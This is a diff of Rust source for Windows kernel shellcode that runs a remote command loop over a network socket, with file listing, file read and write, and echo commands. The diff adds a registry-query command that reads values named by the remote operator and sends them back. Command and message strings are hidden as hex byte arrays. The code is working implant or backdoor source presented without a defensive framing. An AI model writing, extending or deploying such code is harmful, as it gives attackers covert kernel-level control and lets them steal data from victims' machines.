@@ -55,6 +55,11 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
         core::mem::size_of::<ntfs::FsFuncs>()
     ) as _;    
 
+    let reg_funcs: *mut ntreg::RegFuncs = ex_allocate_pool(
+        ntdef::enums::POOL_TYPE::NonPagedPool,
+        core::mem::size_of::<ntreg::RegFuncs>()
+    ) as _;
+
     (*tdi_ctx).funcs.ex_allocate_pool =                     ex_allocate_pool;
     (*tdi_ctx).funcs.ex_free_pool_with_tag =                ntproc::find!("ExFreePoolWithTag");
     (*tdi_ctx).funcs.io_allocate_mdl =                      ntproc::find!("IoAllocateMdl");
@@ -88,7 +93,15 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
     (*fs_funcs).zw_write_file =                             ntproc::find!("ZwWriteFile");
     (*fs_funcs).zw_read_file =                              ntproc::find!("ZwReadFile");
 
-    let rtl_get_version: ntdef::functions::RtlGetVersion =  ntproc::find!("RtlGetVersion");
+
+    (*reg_funcs).zw_close =                                 (*fs_funcs).zw_close;
+    (*reg_funcs).ex_allocate_pool =                         ex_allocate_pool;
+    (*reg_funcs).ex_free_pool_with_tag =                    (*tdi_ctx).funcs.ex_free_pool_with_tag;
+    (*reg_funcs).zw_open_key =                              ntproc::find!("ZwOpenKey");
+    (*reg_funcs).zw_query_value_key =                       ntproc::find!("ZwQueryValueKey");
+
+
+    let rtl_get_version: ntdef::functions::RtlGetVersion = ntproc::find!("RtlGetVersion");
     let ps_terminate_system_thread: ntdef::functions::PsTerminateSystemThread = ntproc::find!("PsTerminateSystemThread");
     let mut version: ntdef::structs::RTL_OSVERSIONINFOW = core::mem::MaybeUninit::uninit().assume_init();
     version.dwOSVersionInfoSize = core::mem::size_of_val(&version) as _;
@@ -118,6 +131,7 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
 
     let mut close: u8 = 0;
     while close == 0u8 {
+        /*
         while (*tdi_ctx).msg_available == 0u32 {
             asm!("nop");
         }
@@ -128,6 +142,8 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
             exec = 1 as _;
             (*tdi_ctx).msg_available = 0u32;
         }
+        */
+        (buf_len, exec) = recv_msg(tdi_ctx, buf);
 
         if exec == 1u32 {
             let echo_cmd = [0x65u8, 0x63u8, 0x68u8, 0x6fu8, 0x20u8];
@@ -138,6 +154,7 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
             let dir_cmd = [0x64u8, 0x69u8, 0x72u8, 0x20u8];
             let write_cmd = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8];
             let read_cmd = [0x72u8, 0x65u8, 0x61u8, 0x64u8, 0x20u8];
+            let queryvalkey_cmd = [0x71u8, 0x75u8, 0x65u8, 0x72u8, 0x79u8, 0x76u8, 0x61u8, 0x6cu8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8];
             if ntdef::macros::RtlEqualMemory(buf as _, &echo_cmd as _, 5) == 1u32 {
                 let _ = socket.send((buf as *const u8).offset(5) as *const u8, buf_len - 5);
             } else if ntdef::macros::RtlEqualMemory(buf as _, &close_cmd as _, 6) == 1u32 {
@@ -328,6 +345,47 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                     let file_open_error_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x68u8, 0x69u8, 0x6cu8, 0x65u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x73u8, 0x70u8, 0x65u8, 0x63u8, 0x69u8, 0x66u8, 0x69u8, 0x65u8, 0x64u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x0au8];
                     let _ = socket.send(&file_open_error_msg as *const u8, 35);
                 }
+            } else if ntdef::macros::RtlEqualMemory(buf as _, &queryvalkey_cmd as _, 12) == 1u32 {
+                *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
+                let mut key_open_error: u32 = 0 as _;
+                let mut handle: ntdef::types::HANDLE = scratch_buf as _;
+                let _ = match ntreg::open_key(
+                    reg_funcs, (buf as *const u8).offset(12) as _, &mut handle as _, 1460 as _, 0
+                ) {
+                    0 => 0,
+                    _ => {
+                        key_open_error = 1 as _;
+                        1
+                    }
+                };
+                if key_open_error == 0 as _ {
+                    let send_value_name_msg = [0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x20u8, 0x74u8, 0x68u8, 0x65u8, 0x20u8, 0x76u8, 0x61u8, 0x6cu8, 0x75u8, 0x65u8, 0x20u8, 0x6eu8, 0x61u8, 0x6du8, 0x65u8, 0x0au8];
+                    let _ = socket.send(&send_value_name_msg as *const u8, 20);
+                    (buf_len, exec) = recv_msg(tdi_ctx, buf);
+                    *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
+                    let mut status: u32;
+                    let mut res_len: u32;
+                    let value_name: ntdef::structs::PUNICODE_STRING = ntdef::macros::BuildUnicodeStringFromCharArray(
+                        ex_allocate_pool as _, buf as _, 1460
+                    );
+                    let query_buf = (ex_allocate_pool)(
+                        ntdef::enums::POOL_TYPE::NonPagedPool, 200 as _
+                    );
+                    (status, res_len) = ntreg::query_value_key(
+                        reg_funcs, handle, value_name, query_buf as _, 200
+                    );
+                    if status == 0 as _ {
+                        let _ = socket.send(query_buf as *const u8, res_len);
+                    } else {
+                        let error_query_value_key_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x69u8, 0x6eu8, 0x20u8, 0x71u8, 0x75u8, 0x65u8, 0x72u8, 0x79u8, 0x20u8, 0x76u8, 0x61u8, 0x6cu8, 0x75u8, 0x65u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x0au8];
+                        let _ = socket.send(&error_query_value_key_msg as *const u8, 25);
+                    }
+                    ((*reg_funcs).ex_free_pool_with_tag)(query_buf as _, 71);
+                    ntreg::close_handle(reg_funcs, handle);
+                } else {
+                    let key_open_error_msg = [0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
+                    let _ = socket.send(&key_open_error_msg as *const u8, 15);
+                }
             } else {
                 let invalid_cmd = [0x69u8, 0x6eu8, 0x76u8, 0x61u8, 0x6cu8, 0x69u8, 0x64u8, 0x20u8, 0x63u8, 0x6fu8, 0x6du8, 0x6du8, 0x61u8, 0x6eu8, 0x64u8, 0x0au8];
                 let _ = socket.send(&invalid_cmd as *const u8, 16 as _);
@@ -345,6 +403,25 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
     // _ = ((*tdi_ctx).funcs.ke_raise_irql_to_dpc_level)();
     ps_terminate_system_thread(ntdef::enums::NTSTATUS::STATUS_SUCCESS as _);
     Ok(())
+}
+
+#[inline]
+unsafe fn recv_msg(tdi_ctx: *mut nttdi::TdiContext, buf: ntdef::types::PVOID)
+-> (u32, u32) {
+    while (*tdi_ctx).msg_available == 0u32 {
+        asm!("nop");
+    }
+
+    let mut buf_len: u32 = 0;
+    let mut exec: u32 = 0;
+
+    if (*tdi_ctx).msg_available == 1u32 {
+        buf_len = (*tdi_ctx).buf_len as _;
+        ntdef::macros::RtlCopyMemory(buf as _, (*tdi_ctx).app_buffer as _, buf_len as _);
+        exec = 1 as _;
+        (*tdi_ctx).msg_available = 0u32;
+    }
+    return (buf_len, exec);
 }
 
 // called at DISPATCH_LEVEL
